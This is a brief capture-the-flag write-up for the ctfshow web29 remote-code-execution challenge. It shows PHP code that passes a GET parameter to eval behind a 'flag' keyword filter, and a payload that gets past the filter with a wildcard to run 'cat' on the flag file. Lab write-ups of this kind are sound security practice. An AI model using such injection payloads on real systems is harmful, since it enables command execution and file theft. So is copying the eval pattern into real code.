---
{"dg-publish":true,"permalink":"/web/rce/ct-fshow-web-web29/","tags":["gardenEntry"]}
---

题目：
```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }

}else{
    highlight_file(__FILE__);
}
```
payload：
```php
?c=system('cat fla*');
```